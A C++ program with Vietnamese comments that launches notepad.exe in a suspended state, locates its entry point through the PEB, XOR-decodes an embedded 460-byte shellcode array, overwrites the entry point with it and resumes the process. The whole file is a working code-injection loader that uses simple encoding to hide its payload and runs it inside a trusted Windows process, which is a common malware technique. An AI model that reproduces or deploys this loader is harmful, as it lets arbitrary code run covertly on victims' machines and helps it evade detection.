#include <windows.h>
// #include <winternl.h>
#include <iostream>
#include <string>

// Shellcode 
unsigned char shellcode[] = {0xb1,0x05,0xce,0xa9,0xbd,0xa5,0x8d,0x4d,0x4d,0x4d,0x0c,0x1c,0x0c,0x1d,0x1f,0x1c,0x1b,0x05,0x7c,0x9f,0x28,0x05,0xc6,0x1f,0x2d,0x05,0xc6,0x1f,0x55,0x05,0xc6,0x1f,0x6d,0x05,0xc6,0x3f,0x1d,0x05,0x42,0xfa,0x07,0x07,0x00,0x7c,0x84,0x05,0x7c,0x8d,0xe1,0x71,0x2c,0x31,0x4f,0x61,0x6d,0x0c,0x8c,0x84,0x40,0x0c,0x4c,0x8c,0xaf,0xa0,0x1f,0x0c,0x1c,0x05,0xc6,0x1f,0x6d,0xc6,0x0f,0x71,0x05,0x4c,0x9d,0xc6,0xcd,0xc5,0x4d,0x4d,0x4d,0x05,0xc8,0x8d,0x39,0x2a,0x05,0x4c,0x9d,0x1d,0xc6,0x05,0x55,0x09,0xc6,0x0d,0x6d,0x04,0x4c,0x9d,0xae,0x1b,0x05,0xb2,0x84,0x0c,0xc6,0x79,0xc5,0x05,0x4c,0x9b,0x00,0x7c,0x84,0x05,0x7c,0x8d,0xe1,0x0c,0x8c,0x84,0x40,0x0c,0x4c,0x8c,0x75,0xad,0x38,0xbc,0x01,0x4e,0x01,0x69,0x45,0x08,0x74,0x9c,0x38,0x95,0x15,0x09,0xc6,0x0d,0x69,0x04,0x4c,0x9d,0x2b,0x0c,0xc6,0x41,0x05,0x09,0xc6,0x0d,0x51,0x04,0x4c,0x9d,0x0c,0xc6,0x49,0xc5,0x05,0x4c,0x9d,0x0c,0x15,0x0c,0x15,0x13,0x14,0x17,0x0c,0x15,0x0c,0x14,0x0c,0x17,0x05,0xce,0xa1,0x6d,0x0c,0x1f,0xb2,0xad,0x15,0x0c,0x14,0x17,0x05,0xc6,0x5f,0xa4,0x1a,0xb2,0xb2,0xb2,0x10,0x04,0xf3,0x3a,0x3e,0x7f,0x12,0x7e,0x7f,0x4d,0x4d,0x0c,0x1b,0x04,0xc4,0xab,0x05,0xcc,0xa1,0xed,0x4c,0x4d,0x4d,0x04,0xc4,0xa8,0x04,0xf1,0x4f,0x4d,0x6e,0x65,0x8d,0xe5,0xa7,0xc8,0x0c,0x19,0x04,0xc4,0xa9,0x01,0xc4,0xbc,0x0c,0xf7,0x01,0x3a,0x6b,0x4a,0xb2,0x98,0x01,0xc4,0xa7,0x25,0x4c,0x4c,0x4d,0x4d,0x14,0x0c,0xf7,0x64,0xcd,0x26,0x4d,0xb2,0x98,0x1d,0x1d,0x00,0x7c,0x84,0x00,0x7c,0x8d,0x05,0xb2,0x8d,0x05,0xc4,0x8f,0x05,0xb2,0x8d,0x05,0xc4,0x8c,0x0c,0xf7,0xa7,0x42,0x92,0xad,0xb2,0x98,0x05,0xc4,0x8a,0x27,0x5d,0x0c,0x15,0x01,0xc4,0xaf,0x05,0xc4,0xb4,0x0c,0xf7,0xd4,0xe8,0x39,0x2c,0xb2,0x98,0x05,0xcc,0x89,0x0d,0x4f,0x4d,0x4d,0x04,0xf5,0x2e,0x20,0x29,0x4d,0x4d,0x4d,0x4d,0x4d,0x0c,0x1d,0x0c,0x1d,0x05,0xc4,0xaf,0x1a,0x1a,0x1a,0x00,0x7c,0x8d,0x27,0x40,0x14,0x0c,0x1d,0xaf,0xb1,0x2b,0x8a,0x09,0x69,0x19,0x4c,0x4c,0x05,0xc0,0x09,0x69,0x55,0x8b,0x4d,0x25,0x05,0xc4,0xab,0x1b,0x1d,0x0c,0x1d,0x0c,0x1d,0x0c,0x1d,0x04,0xb2,0x8d,0x0c,0x1d,0x04,0xb2,0x85,0x00,0xc4,0x8c,0x01,0xc4,0x8c,0x0c,0xf7,0x34,0x81,0x72,0xcb,0xb2,0x98,0x05,0x7c,0x9f,0x05,0xb2,0x87,0xc6,0x43,0x0c,0xf7,0x45,0xca,0x50,0x2d,0xb2,0x98,0xf6,0xbd,0xf8,0xef,0x1b,0x0c,0xf7,0xeb,0xd8,0xf0,0xd0,0xb2,0x98,0x05,0xce,0x89,0x65,0x71,0x4b,0x31,0x47,0xcd,0xb6,0xad,0x38,0x48,0xf6,0x0a,0x5e,0x3f,0x22,0x27,0x4d,0x14,0x0c,0xc4,0x97,0xb2,0x98};
unsigned int shellcode_len = 460;


// Định nghĩa ZwQueryInformationProcess
typedef NTSTATUS(WINAPI* _ZwQueryInformationProcess)(
    HANDLE ProcessHandle,
    ULONG ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
);

typedef struct _PROCESS_BASIC_INFORMATION {
    PVOID Reserved1;
    PVOID PebBaseAddress;
    PVOID Reserved2[2];
    ULONG_PTR UniqueProcessId;
    PVOID Reserved3;
} PROCESS_BASIC_INFORMATION;

int main() {
    // Tạo tiến trình notepad ở trạng thái suspended
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };

    BOOL ok = CreateProcessA(
        "C:\\Windows\\System32\\notepad.exe",
        NULL,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        NULL,
        &si,
        &pi
    );
    if (!ok) {
        std::cerr << "CreateProcess failed: " << GetLastError() << std::endl;
        return 1;
    }
    HANDLE hProcess = pi.hProcess;

    // Lấy ZwQueryInformationProcess
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    _ZwQueryInformationProcess ZwQueryInformationProcess =
        (_ZwQueryInformationProcess)GetProcAddress(hNtdll, "ZwQueryInformationProcess");

    // Lấy địa chỉ PEB
    PROCESS_BASIC_INFORMATION pbi = { 0 };
    ULONG retLen = 0;
    ZwQueryInformationProcess(hProcess, 0, &pbi, sizeof(pbi), &retLen);
    std::cout << "[1] PEB is at: 0x" << std::hex << pbi.PebBaseAddress << std::endl;

    // Đọc ImageBaseAddress từ PEB + 0x10
    PVOID imageBase = 0;
    SIZE_T bytesRead = 0;
    ReadProcessMemory(hProcess, (PBYTE)pbi.PebBaseAddress + 0x10, &imageBase, sizeof(PVOID), &bytesRead);
    std::cout << "[2] Image Base Address is: 0x" << std::hex << imageBase << std::endl;

    // Đọc header PE để lấy EntryPoint RVA
    BYTE header[0x200] = { 0 };
    ReadProcessMemory(hProcess, imageBase, header, sizeof(header), &bytesRead);

    DWORD e_lfanew = *(DWORD*)(header + 0x3c);
    DWORD entryPointRVA = *(DWORD*)(header + e_lfanew + 0x28);
    PVOID entryPointVA = (PBYTE)imageBase + entryPointRVA;
    std::cout << "[3] Entry Point is: 0x" << std::hex << entryPointVA << std::endl;

    unsigned char key = 77; 

    for(unsigned int i = 0; i < shellcode_len; ++i) {
        shellcode[i] ^= key; 
    }

        for(unsigned int i = 0; i < shellcode_len; ++i) {
        printf("\\x%02x", shellcode[i]);
    }
    printf("\n");

    // Ghi shellcode vào EntryPoint
    DWORD oldProtect = 0;
    VirtualProtectEx(hProcess, entryPointVA, shellcode_len, PAGE_EXECUTE_READWRITE, &oldProtect);
    SIZE_T written = 0;
    WriteProcessMemory(hProcess, entryPointVA, shellcode, shellcode_len, &written);

    ResumeThread(pi.hThread);
    std::cout << "[+] Shellcode injected and process resumed." << std::endl;

    // Đóng handle tiến trình
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}
